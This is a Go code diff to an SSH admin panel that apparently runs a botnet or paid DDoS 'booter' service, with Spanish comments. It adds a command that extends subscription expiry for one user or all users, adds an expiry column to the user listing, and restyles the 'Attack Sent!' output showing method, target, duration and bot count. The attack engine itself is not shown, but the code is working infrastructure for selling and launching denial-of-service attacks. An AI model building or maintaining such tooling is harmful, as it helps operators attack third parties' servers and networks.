@@ -1016,48 +1016,73 @@ func AdminSSH(conn net.Conn) {
 			//============================================================================================================================================================================================================================================================================//
 
 		case "days":
-
 			if !session.User.Admin {
 				session.Conn.Write([]byte(ansiWarning + "You don't have the access for that!" + ansiReset + "\r\n"))
 				continue
 			}
 
-			args := strings.Split(command, " ")[1:]
+			args := strings.Fields(command)[1:] // Usar Fields para manejar múltiples espacios
 
 			if len(args) == 0 {
+				// Mostrar estado del propio usuario
 				status := ansiWarning + "disabled" + ansiReset
 				if session.User.Expiry > 0 {
 					expiryTime := time.Unix(session.User.Expiry, 0)
 					status = fmt.Sprintf("%s%s%s", ansiNumbers, expiryTime.Format("2006-01-02 15:04:05"), ansiReset)
 				}
 				session.Conn.Write([]byte(ansiSystem + "Your expiry status: " + status + "\r\n" + ansiReset))
-				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": days <number> <username>\r\n"))
+				session.Conn.Write([]byte(ansiSeparator + "Usage" + ansiReset + ": days <number> <username|all>\r\n"))
 				continue
 			}
 
-			if len(args) <= 1 {
-				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
+			if len(args) < 2 {
+				session.Conn.Write([]byte(ansiWarning + "You must provide a username (or 'all') and days" + ansiReset + "\r\n"))
 				continue
 			}
 
 			days, err := strconv.Atoi(args[0])
 			if err != nil {
-				session.Conn.Write([]byte(ansiWarning + "You must provide a username & time" + ansiReset + "\r\n"))
+				session.Conn.Write([]byte(ansiWarning + "Invalid number of days" + ansiReset + "\r\n"))
 				continue
 			}
 
-			user, err := FindUser(args[1])
+			targetName := args[1]
+
+			// Si el target es "all", "todos" o "*", aplicar a todos excepto root
+			if strings.EqualFold(targetName, "all") || strings.EqualFold(targetName, "todos") || targetName == "*" {
+				allUsers, err := GetUsers()
+				if err != nil {
+					session.Conn.Write([]byte(ansiError + "Failed to retrieve users" + ansiReset + "\r\n"))
+					continue
+				}
+
+				count := 0
+				for _, u := range allUsers {
+					newExpiry := time.Now().Add(time.Duration(days) * 24 * time.Hour).Unix()
+					if err := ModifyField(u, "expiry", newExpiry); err != nil {
+						session.Conn.Write([]byte(ansiError + fmt.Sprintf("Failed to update user %s: %v", u.Username, err) + ansiReset + "\r\n"))
+						continue
+					}
+					count++
+				}
+				session.Conn.Write([]byte(ansiSuccess + fmt.Sprintf("Added %d days to %d users", days, count) + ansiReset + "\r\n"))
+				continue
+			}
+
+			// Caso normal: un solo usuario
+			user, err := FindUser(targetName)
 			if err != nil || user == nil {
-				session.Conn.Write([]byte(ansiError + "User doesnt exist" + ansiReset + "\r\n"))
+				session.Conn.Write([]byte(ansiError + "User doesn't exist" + ansiReset + "\r\n"))
 				continue
 			}
 
-			if err := ModifyField(user, "expiry", time.Now().Add(time.Duration(days)*24*time.Hour).Unix()); err != nil {
-				session.Conn.Write([]byte(ansiError + "Failed to modify users maxtime status" + ansiReset + "\r\n"))
+			newExpiry := time.Now().Add(time.Duration(days) * 24 * time.Hour).Unix()
+			if err := ModifyField(user, "expiry", newExpiry); err != nil {
+				session.Conn.Write([]byte(ansiError + "Failed to modify user's expiry" + ansiReset + "\r\n"))
 				continue
 			}
 
-			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed users expiry status to %s%d%s!%s\r\n", ansiSuccess, ansiNumbers, days, ansiSuccess, ansiReset)))
+			session.Conn.Write([]byte(fmt.Sprintf("%sSuccessfully changed expiry for %s to +%d days!%s\r\n", ansiSuccess, user.Username, days, ansiReset)))
 			continue
 
 			// Create a new user
@@ -1197,6 +1222,7 @@ func AdminSSH(conn net.Conn) {
 					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Conns" + ansiReset},
 					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Cooldown" + ansiReset},
 					{Align: simpletable.AlignCenter, Text: ansiSeparator + "MaxDaily" + ansiReset},
+					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Expiry" + ansiReset}, // Días restantes
 					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Admin" + ansiReset},
 					{Align: simpletable.AlignCenter, Text: ansiSeparator + "Reseller" + ansiReset},
 					{Align: simpletable.AlignCenter, Text: ansiSeparator + "API" + ansiReset},
@@ -1204,6 +1230,19 @@ func AdminSSH(conn net.Conn) {
 			}
 
 			for _, u := range users {
+				// Calcular días restantes o mostrar estado especial
+				var daysDisplay string
+				if u.Expiry == 0 {
+					daysDisplay = ansiWarning + "N/A" + ansiReset
+				} else {
+					daysLeft := int(time.Until(time.Unix(u.Expiry, 0)).Hours() / 24)
+					if daysLeft < 0 {
+						daysDisplay = ansiError + "Expired" + ansiReset
+					} else {
+						daysDisplay = fmt.Sprintf("%s%d%s", ansiNumbers, daysLeft, ansiReset)
+					}
+				}
+
 				row := []*simpletable.Cell{
 					{Align: simpletable.AlignCenter, Text: ansiNumbers + fmt.Sprint(u.ID) + ansiReset},
 					{Align: simpletable.AlignCenter, Text: ansiPrimary + fmt.Sprint(u.Username) + ansiReset},
@@ -1211,6 +1250,7 @@ func AdminSSH(conn net.Conn) {
 					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%s%d%s", ansiNumbers, u.Conns, ansiReset)},
 					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%s%d%s", ansiNumbers, u.Cooldown, ansiReset)},
 					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("%s%d%s", ansiNumbers, u.MaxDaily, ansiReset)},
+					{Align: simpletable.AlignCenter, Text: daysDisplay},
 					{Align: simpletable.AlignCenter, Text: FormatBool(u.Admin)},
 					{Align: simpletable.AlignCenter, Text: FormatBool(u.Reseller)},
 					{Align: simpletable.AlignCenter, Text: FormatBool(u.API)},
@@ -1736,16 +1776,18 @@ func AdminSSH(conn net.Conn) {
 
 			botsDisplay := fmt.Sprintf("[%d/%d]", botsToUse, totalBots)
 
-			session.Conn.Write([]byte(ansiSuccess + "• Attack Sent!" + ansiReset + "\r\n"))
-			session.Conn.Write([]byte(fmt.Sprintf("%s• Method\t: %s[%s]%s\r\n", ansiCommands, ansiNumbers, methodDisplay, ansiReset)))
-			session.Conn.Write([]byte(fmt.Sprintf("%s• Target\t: %s[%s]%s\r\n", ansiCommands, ansiNumbers, targetDisplay, ansiReset)))
-			session.Conn.Write([]byte(fmt.Sprintf("%s• Duration\t: %s[%s]%s\r\n", ansiCommands, ansiNumbers, durationDisplay, ansiReset)))
+			indent := "  " // dos espacios, ajustable
+
+			session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + "Attack Sent!" + ansiReset + "\r\n"))
+			session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + "Method" + ansiReset + ansiSystem + ":" + ansiReset + "\t" + ansiCommands + "[" + methodDisplay + "]" + ansiReset + "\r\n"))
+			session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + "Target" + ansiReset + ansiSystem + ":" + ansiReset + "\t" + ansiCommands + "[" + targetDisplay + "]" + ansiReset + "\r\n"))
+			session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + "Duration" + ansiReset + ansiSystem + ":" + ansiReset + "\t" + ansiCommands + "[" + durationDisplay + "]" + ansiReset + "\r\n"))
 			if flagsStr != "" {
-				session.Conn.Write([]byte(fmt.Sprintf("%s• Flags\t\t: %s[%s]%s\r\n", ansiCommands, ansiNumbers, flagsStr, ansiReset)))
+				session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + "Flags" + ansiReset + ansiSystem + ":" + ansiReset + "\t" + ansiCommands + "[" + flagsStr + "]" + ansiReset + "\r\n"))
 			} else {
-				session.Conn.Write([]byte(fmt.Sprintf("%s• Flags\t\t: %s[none]%s\r\n", ansiCommands, ansiNumbers, ansiReset)))
+				session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + "Flags" + ansiReset + ansiSystem + ":" + ansiReset + "\t" + ansiCommands + "[none]" + ansiReset + "\r\n"))
 			}
-			session.Conn.Write([]byte(fmt.Sprintf("%s• Bots\t\t: %s%s%s\r\n", ansiCommands, ansiNumbers, botsDisplay, ansiReset)))
+			session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + "Bots" + ansiReset + ansiSystem + ":" + ansiReset + "\t" + ansiCommands + botsDisplay + ansiReset + "\r\n"))
 		}
 	}
 }
